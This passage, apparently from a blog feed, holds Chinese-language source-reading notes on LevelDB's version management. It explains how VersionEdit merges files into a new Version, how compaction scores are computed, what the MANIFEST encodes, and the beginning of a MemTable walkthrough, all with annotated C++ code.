&#125;</span><br></pre></td></tr></table></figure><p>base_存放的是当前系统版本，我们的目标是使用当前versionedit+base_得到一个新的version。这里的工作就是将builder中的文件+base_中的文件融合后加入到version中。核心逻辑如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;FileMetaData*&gt;::const_iterator bpos =</span><br><span class="line">                <span class="built_in">std</span>::upper_bound(base_iter, base_end, added_file, cmp);</span><br><span class="line">            base_iter != bpos; ++base_iter) &#123;</span><br><span class="line"></span><br><span class="line">         MaybeAddFile(v, level, *base_iter);</span><br><span class="line">       &#125;</span><br><span class="line"> <span class="comment">// 加入 added_file</span></span><br><span class="line">       MaybeAddFile(v, level, added_file);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>引用Api文档中对std中的upper_bound的作用的解释：</p><blockquote><p>函数签名：</p><p>template&lt; class ForwardIt, class T, class Compare &gt;<br>ForwardIt upper_bound( ForwardIt first, ForwardIt last, const T&amp; value, Compare comp );</p><p>解释：</p><p>Returns an iterator pointing to the first element in the range <code>[first, last)</code> that is <em>greater</em> than <code>value</code>, or <code>last</code> if no such element is found.</p></blockquote><p>具体例子，假设有<code>[1,3,7,8]</code>, 现在value设置为5， 则upper_bound返回的iterator指向 7.</p><p>有了对upper_bound的理解+ added_files内部是有序的前提，就不难理解这个循环了。画个图：</p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-copy-第 29 页.png" style="zoom:33%;" /><p>第一次循环：added_file=2，bpos指向7，所以base_iter只能添加1，接着添加added_file=2.</p><p>第二次循环，added_file=3,bpos指向7，因为base_iter已经指向7，所以不从base_添加，只加入3</p><p>第三次循环, added_file=11, bpos指向15，从base_中添加7和10，再添加added_file=11</p><p>第四次循环，added_file=16，bpos指向<code>last</code>，从base_中添加15，再添加added_file=16</p><p>最终可得如图所示结果。</p><p>不过这一切都建立在added_files中的所有文件都会添加到最终version，但实际上却不一定，所以用了<code>MaybeAddFile</code> 可能添加File：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MaybeAddFile</span><span class="params">(Version* v, <span class="keyword">int</span> level, FileMetaData* f)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (levels_[level].deleted_files.count(f-&gt;number) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">     <span class="comment">// File is deleted: do nothing  // 在删除列表中，文件将被删除，不用添加</span></span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;<span class="comment">// </span></span><br><span class="line">     <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;FileMetaData*&gt;* files = &amp;v-&gt;files_[level];</span><br><span class="line">     <span class="keyword">if</span> (level &gt; <span class="number">0</span> &amp;&amp; !files-&gt;empty()) &#123;<span class="comment">// 考虑level&gt;0, 要求key不能overlap</span></span><br><span class="line">       <span class="comment">// Must not overlap</span></span><br><span class="line">       assert(vset_-&gt;icmp_.Compare((*files)[files-&gt;<span class="built_in">size</span>() - <span class="number">1</span>]-&gt;largest,</span><br><span class="line">                                   f-&gt;smallest) &lt; <span class="number">0</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     f-&gt;refs++;<span class="comment">//  当前新版本v 对file有引用，所以refs++</span></span><br><span class="line">     files-&gt;push_back(f); <span class="comment">// 实际压入到新版本</span></span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>通过 deleted_files来判定是否需要添加这个文件,如果deleted_files中没有该file number，则可以添加，否则不能添加。现在联系前面留下的问题：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">levels_[level].deleted_files.erase(f-&gt;number);<span class="comment">// 这里非常奇怪，将再SaveTo函数里面谈一点个人的理解</span></span><br><span class="line">levels_[level].added_files-&gt;insert(f);</span><br></pre></td></tr></table></figure><p>这两行代码会觉得非常奇怪，为什么前期加上了要删除的文件，这里却又要删除了？以下只是我个人的看法，<strong>经过我个人的测试，正常情况和系统crash的情况下，<code>levels_[level].deleted_files.erase(f-&gt;number);</code>这句话是完全不起作用的，永远不会擦除到元素。那是否这行代码就没用？我也不知道，希望后来人能告诉我。</strong></p><p>目前我将这行代码改为了：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> n = levels_[level].deleted_files.erase(f-&gt;number);</span><br><span class="line">assert(n==<span class="number">0</span>);</span><br><span class="line">levels_[level].added_files-&gt;insert(f);</span><br></pre></td></tr></table></figure><p>但还没出现过assert失败过。后期测试中一旦出现，再补上。</p><h3 id="2-Finalize"><a href="#2-Finalize" class="headerlink" title="2. Finalize"></a>2. Finalize</h3><p>生成新版本后，需要更新这个新版本的compaction辅助变量，用于下次compaction，这个工作由Finalize函数完成。这里只用知道这个有这个功能即可，具体再Compaction章节再说。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">VersionSet::Finalize</span><span class="params">(Version* v)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Precomputed best level for next compaction</span></span><br><span class="line">  <span class="keyword">int</span> best_level = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">double</span> best_score = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> level = <span class="number">0</span>; level &lt; <span class="built_in">config</span>::kNumLevels - <span class="number">1</span>; level++) &#123;</span><br><span class="line">    <span class="keyword">double</span> score;</span><br><span class="line">    <span class="keyword">if</span> (level == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">// level0 单独处理，文件数量 超过kL0_CompactionTrigger时，就trigger compaction</span></span><br><span class="line">        </span><br><span class="line">      <span class="comment">// We treat level-0 specially by bounding the number of files</span></span><br><span class="line">      <span class="comment">// instead of number of bytes for two reasons:</span></span><br><span class="line">      <span class="comment">//</span></span><br><span class="line">      <span class="comment">// (1) With larger write-buffer sizes, it is nice not to do too</span></span><br><span class="line">      <span class="comment">// many level-0 compactions.</span></span><br><span class="line">      <span class="comment">//</span></span><br><span class="line">      <span class="comment">// (2) The files in level-0 are merged on every read and</span></span><br><span class="line">      <span class="comment">// therefore we wish to avoid too many files when the individual</span></span><br><span class="line">      <span class="comment">// file size is small (perhaps because of a small write-buffer</span></span><br><span class="line">      <span class="comment">// setting, or very high compression ratios, or lots of</span></span><br><span class="line">      <span class="comment">// overwrites/deletions).</span></span><br><span class="line">      score = v-&gt;files_[level].<span class="built_in">size</span>() /</span><br><span class="line">              <span class="keyword">static_cast</span>&lt;<span class="keyword">double</span>&gt;(<span class="built_in">config</span>::kL0_CompactionTrigger);<span class="comment">// static const int kL0_CompactionTrigger = 4;</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 其余level 用文件size来比较</span></span><br><span class="line">      <span class="comment">// Compute the ratio of current size to size limit.</span></span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">uint64_t</span> level_bytes = TotalFileSize(v-&gt;files_[level]);</span><br><span class="line">      score =</span><br><span class="line">          <span class="keyword">static_cast</span>&lt;<span class="keyword">double</span>&gt;(level_bytes) / MaxBytesForLevel(options_, level);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (score &gt; best_score) &#123;</span><br><span class="line">      best_level = level;</span><br><span class="line">      best_score = score;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  v-&gt;compaction_level_ = best_level;</span><br><span class="line">  v-&gt;compaction_score_ = best_score;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>level0:  根据文件数量决定。</p><p>其余：根据该层的文件大小决定。</p><h2 id="3-Manifest"><a href="#3-Manifest" class="headerlink" title="3. Manifest"></a>3. Manifest</h2><h3 id="1-向manifest中””写入VersionEdit”"><a href="#1-向manifest中””写入VersionEdit”" class="headerlink" title="1. 向manifest中””写入VersionEdit”"></a>1. 向manifest中””写入VersionEdit”</h3><p>在VersionSet::LogAndApply中的后半段就是与Manifest相关的内容。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">// 下面和Manifest文件相关</span></span><br><span class="line"> <span class="comment">// Initialize new descriptor log file if necessary by creating</span></span><br><span class="line"> <span class="comment">// a temporary file that contains a snapshot of the current version.</span></span><br><span class="line"> <span class="built_in">std</span>::<span class="built_in">string</span> new_manifest_file;</span><br><span class="line"> Status s;</span><br><span class="line"><span class="comment">// 创建manifest writer</span></span><br><span class="line"> <span class="keyword">if</span> (descriptor_log_ == <span class="literal">nullptr</span>) &#123;<span class="comment">// 首次进入，创建manifest writer</span></span><br><span class="line">   <span class="comment">// No reason to unlock *mu here since we only hit this path in the</span></span><br><span class="line">   <span class="comment">// first call to LogAndApply (when opening the database).</span></span><br><span class="line">   assert(descriptor_file_ == <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="comment">// new_manifest_file为当前manifest文件路径</span></span><br><span class="line">   new_manifest_file = DescriptorFileName(dbname_, manifest_file_number_);</span><br><span class="line">   edit-&gt;SetNextFile(next_file_number_);</span><br><span class="line">    <span class="comment">// 创建文件</span></span><br><span class="line">   s = env_-&gt;NewWritableFile(new_manifest_file, &amp;descriptor_file_);</span><br><span class="line">   <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">       <span class="comment">// 创建manifest写者，从本质上来看，manifest和log文件的布局完全相同</span></span><br><span class="line">     descriptor_log_ = <span class="keyword">new</span> <span class="built_in">log</span>::Writer(descriptor_file_);</span><br><span class="line">       <span class="comment">// 保存一次当前系统的快照内容到manifest中</span></span><br><span class="line">     s = WriteSnapshot(descriptor_log_);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// Unlock during expensive MANIFEST log write</span></span><br><span class="line"> &#123;</span><br><span class="line">   mu-&gt;Unlock();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将当前edit内容编码成一条recored，添加到manifest中</span></span><br><span class="line">   <span class="comment">// Write new record to MANIFEST log</span></span><br><span class="line">   <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">     <span class="built_in">std</span>::<span class="built_in">string</span> record;</span><br><span class="line">       <span class="comment">// edit内容编码到record !!, 可以看一下是怎么编码的，这样就知道manifest文件中保存的内容布局了</span></span><br><span class="line">     edit-&gt;EncodeTo(&amp;record);</span><br><span class="line">      <span class="comment">// 写入manifest文件</span></span><br><span class="line">     s = descriptor_log_-&gt;AddRecord(record);</span><br><span class="line">     <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">         <span class="comment">// 刷新到设备上</span></span><br><span class="line">       s = descriptor_file_-&gt;Sync();</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">if</span> (!s.ok()) &#123;</span><br><span class="line">       Log(options_-&gt;info_log, <span class="string">"MANIFEST write: %s\n"</span>, s.ToString().c_str());</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新Current指针</span></span><br><span class="line">   <span class="comment">// If we just created a new descriptor file, install it by writing a</span></span><br><span class="line">   <span class="comment">// new CURRENT file that points to it.</span></span><br><span class="line">   <span class="keyword">if</span> (s.ok() &amp;&amp; !new_manifest_file.empty()) &#123;</span><br><span class="line">     s = SetCurrentFile(env_, dbname_, manifest_file_number_);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   mu-&gt;Lock();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>工作:</p><ol><li><p>如果是首次进入，此时还没有manifest的writer，则新建一个writer，并保存一次当前系统版本的快照到manifest中</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">descriptor_log_ = <span class="keyword">new</span> <span class="built_in">log</span>::Writer(descriptor_file_);</span><br></pre></td></tr></table></figure><p>根据这行代码来看，manifest和log文件的布局是完全相同的。</p></li><li><p>将本次edit中的内容转换成一条记录并Add到manifest中。</p></li></ol><h3 id="2-manifest中保存的内容"><a href="#2-manifest中保存的内容" class="headerlink" title="2. manifest中保存的内容"></a>2. manifest中保存的内容</h3><p>那manifest中到底存放了些什么？这就需要看看<code>EncodeTo</code>函数了：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">VersionEdit::EncodeTo</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span>* dst)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (has_comparator_) &#123;</span><br><span class="line">    PutVarint32(dst, kComparator);</span><br><span class="line">    PutLengthPrefixedSlice(dst, comparator_);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (has_log_number_) &#123;</span><br><span class="line">    PutVarint32(dst, kLogNumber);</span><br><span class="line">    PutVarint64(dst, log_number_);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (has_prev_log_number_) &#123;</span><br><span class="line">    PutVarint32(dst, kPrevLogNumber);</span><br><span class="line">    PutVarint64(dst, prev_log_number_);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (has_next_file_number_) &#123;</span><br><span class="line">    PutVarint32(dst, kNextFileNumber);</span><br><span class="line">    PutVarint64(dst, next_file_number_);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (has_last_sequence_) &#123;</span><br><span class="line">    PutVarint32(dst, kLastSequence);</span><br><span class="line">    PutVarint64(dst, last_sequence_);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; compact_pointers_.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    PutVarint32(dst, kCompactPointer);</span><br><span class="line">    PutVarint32(dst, compact_pointers_[i].first);  <span class="comment">// level</span></span><br><span class="line">    PutLengthPrefixedSlice(dst, compact_pointers_[i].second.Encode());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; deleted_file_kvp : deleted_files_) &#123;</span><br><span class="line">    PutVarint32(dst, kDeletedFile);</span><br><span class="line">    PutVarint32(dst, deleted_file_kvp.first);   <span class="comment">// level</span></span><br><span class="line">    PutVarint64(dst, deleted_file_kvp.second);  <span class="comment">// file number</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; new_files_.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> FileMetaData&amp; f = new_files_[i].second;</span><br><span class="line">    PutVarint32(dst, kNewFile);</span><br><span class="line">    PutVarint32(dst, new_files_[i].first);  <span class="comment">// level</span></span><br><span class="line">    PutVarint64(dst, f.number);</span><br><span class="line">    PutVarint64(dst, f.file_size);</span><br><span class="line">    PutLengthPrefixedSlice(dst, f.smallest.Encode());</span><br><span class="line">    PutLengthPrefixedSlice(dst, f.largest.Encode());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是保存这些字段：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Tag numbers for serialized VersionEdit.  These numbers are written to</span></span><br><span class="line"><span class="comment">// disk and should not be changed.</span></span><br><span class="line"><span class="keyword">enum</span> Tag &#123;</span><br><span class="line">  kComparator = <span class="number">1</span>,</span><br><span class="line">  kLogNumber = <span class="number">2</span>,</span><br><span class="line">  kNextFileNumber = <span class="number">3</span>,</span><br><span class="line">  kLastSequence = <span class="number">4</span>,</span><br><span class="line">  kCompactPointer = <span class="number">5</span>,</span><br><span class="line">  kDeletedFile = <span class="number">6</span>,</span><br><span class="line">  kNewFile = <span class="number">7</span>,</span><br><span class="line">  <span class="comment">// 8 was used for large value refs</span></span><br><span class="line">  kPrevLogNumber = <span class="number">9</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对应VersionEdit中的成员</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> comparator_;</span><br><span class="line"><span class="keyword">uint64_t</span> log_number_;</span><br><span class="line"><span class="keyword">uint64_t</span> prev_log_number_;</span><br><span class="line"><span class="keyword">uint64_t</span> next_file_number_;</span><br><span class="line">SequenceNumber last_sequence_;</span><br><span class="line"><span class="keyword">bool</span> has_comparator_;</span><br><span class="line"><span class="keyword">bool</span> has_log_number_;</span><br><span class="line"><span class="keyword">bool</span> has_prev_log_number_;</span><br><span class="line"><span class="keyword">bool</span> has_next_file_number_;</span><br><span class="line"><span class="keyword">bool</span> has_last_sequence_;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::pair&lt;<span class="keyword">int</span>, InternalKey&gt;&gt; compact_pointers_;</span><br><span class="line">DeletedFileSet deleted_files_;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::pair&lt;<span class="keyword">int</span>, FileMetaData&gt;&gt; new_files_;</span><br></pre></td></tr></table></figure><p>如下图：</p><p><img data-src="https://bean-li.github.io/assets/LevelDB/write_a_manifest.png" alt="img"></p><h1 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h1><p>本文中，我们介绍了leveldb中的重要数据结构，Version，VersionEdit和VersionSet。特别是VersionEdit，它表示了一次leveldb操作过程产生的文件增删的差量。 详细剖析了如何从一个旧版本，通过应用VersionEdit，产生一个新版本。最后，我们还讲解了Manifest文件，它是用来表述sstable的元数据的文件，其内容来自VersionEdit。</p>]]></content>
      
      
      <categories>
          
          <category> leveldb </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>leveldb源码阅读记录-Memtable</title>
      <link href="/archives/aba77258.html"/>
      <url>/archives/aba77258.html</url>
      
        <content type="html"><![CDATA[<p>上文我们介绍了Skiplist，它是leveldbMemtable的底层数据结构，这篇文章，我们一起来分析MemTable。</p><a id="more"></a><h2 id="1-MemTable定义"><a href="#1-MemTable定义" class="headerlink" title="1. MemTable定义"></a>1. MemTable定义</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MemTable</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// MemTables are reference counted.  The initial reference count</span></span><br><span class="line">  <span class="comment">// is zero and the caller must call Ref() at least once.</span></span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">MemTable</span><span class="params">(<span class="keyword">const</span> InternalKeyComparator&amp; comparator)</span></span>;</span><br><span class="line"></span><br><span class="line">  MemTable(<span class="keyword">const</span> MemTable&amp;) = <span class="keyword">delete</span>;</span><br><span class="line">  MemTable&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> MemTable&amp;) = <span class="keyword">delete</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Increase reference count.</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Ref</span><span class="params">()</span> </span>&#123; ++refs_; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Drop reference count.  Delete if no more references exist.</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Unref</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    --refs_;</span><br><span class="line">    assert(refs_ &gt;= <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (refs_ &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">delete</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Returns an estimate of the number of bytes of data in use by this</span></span><br><span class="line">  <span class="comment">// data structure. It is safe to call when MemTable is being modified.</span></span><br><span class="line">  <span class="function"><span class="keyword">size_t</span> <span class="title">ApproximateMemoryUsage</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Return an iterator that yields the contents of the memtable.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// The caller must ensure that the underlying MemTable remains live</span></span><br><span class="line">  <span class="comment">// while the returned iterator is live.  The keys returned by this</span></span><br><span class="line">  <span class="comment">// iterator are internal keys encoded by AppendInternalKey in the</span></span><br><span class="line">  <span class="comment">// db/format.&#123;h,cc&#125; module.</span></span><br><span class="line">  <span class="function">Iterator* <span class="title">NewIterator</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Add an entry into memtable that maps key to value at the</span></span><br><span class="line">  <span class="comment">// specified sequence number and with the specified type.</span></span><br><span class="line">  <span class="comment">// Typically value will be empty if type==kTypeDeletion.</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Add</span><span class="params">(SequenceNumber seq, ValueType type, <span class="keyword">const</span> Slice&amp; key,</span></span></span><br><span class="line"><span class="function"><span class="params">           <span class="keyword">const</span> Slice&amp; value)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If memtable contains a value for key, store it in *value and return true.</span></span><br><span class="line">  <span class="comment">// If memtable contains a deletion for key, store a NotFound() error</span></span><br><span class="line">  <span class="comment">// in *status and return true.</span></span><br><span class="line">  <span class="comment">// Else, return false.</span></span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">Get</span><span class="params">(<span class="keyword">const</span> LookupKey&amp; key, <span class="built_in">std</span>::<span class="built_in">string</span>* value, Status* s)</span></span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">MemTableIterator</span>;</span></span><br><span class="line">  <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">MemTableBackwardIterator</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">KeyComparator</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> InternalKeyComparator comparator;</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">KeyComparator</span><span class="params">(<span class="keyword">const</span> InternalKeyComparator&amp; c)</span> : <span class="title">comparator</span><span class="params">(c)</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* a, <span class="keyword">const</span> <span class="keyword">char</span>* b)</span> <span class="keyword">const</span></span>;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 注意skiplist存放的key是 const char *类型</span></span><br><span class="line">  <span class="keyword">typedef</span> SkipList&lt;<span class="keyword">const</span> <span class="keyword">char</span>*, KeyComparator&gt; Table;</span><br><span class="line"></span><br><span class="line">  ~MemTable();  <span class="comment">// Private since only Unref() should be used to delete it</span></span><br><span class="line"></span><br><span class="line">  KeyComparator comparator_;</span><br><span class="line">  <span class="keyword">int</span> refs_;</span><br><span class="line">  Arena arena_;</span><br><span class="line">  Table table_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>MemTable里面有3个重要的数据结构：</p><ol><li>KeyComparator ，比较器，在Get操作中会用到。</li><li>Arena，内存分配器，在Add操作中用到。</li><li>SkipList，核心数据结构，管理数据。 <strong>注意key就是一个char *， 内部比较器采用的是InternalKeyComparator.</strong></li></ol><h2 id="2-Key类型分类"><a href="#2-Key类型分类" class="headerlink" title="2. Key类型分类"></a>2. 